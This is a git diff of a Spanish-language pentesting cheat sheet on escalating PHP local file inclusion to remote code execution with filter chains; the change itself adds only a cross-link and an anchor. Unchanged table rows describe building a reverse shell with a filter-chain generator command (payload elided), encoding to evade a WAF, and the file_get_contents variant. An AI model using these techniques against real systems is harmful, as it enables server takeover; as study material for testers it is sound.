@@ -7,6 +7,7 @@ secondary categories:
 tertiary categories:
 type: CheatSheet
 linked:
+  - "[[File Inclusion]]"
 ---
 # LFI To RCE - PHP Filter Chains 
 
@@ -26,7 +27,7 @@ linked:
 | <br>Filter chain + reverse shell        | <br>Generar una reverse shell completa mediante filter chains<br><br>                                    | <br>`python3 php_filter_chain_generator.py --chain '<?php exec("/bin/bash -c ..."); ?>'` |
 | <br>Filter chain con WAF bypass         | <br>Generar el payload encodeado para evadir detección de WAF<br><br>                                    | <br>Payload resultante no contiene strings sospechosas legibles                          |
 | <br>Filter chain con file_get_contents  | <br>Funciona también cuando la función vulnerable es `file_get_contents` en vez de `include`<br><br>     | <br>Mismo payload, distinta función vulnerable                                           |
-
+^lfi-phpfilter
 
 
 ***
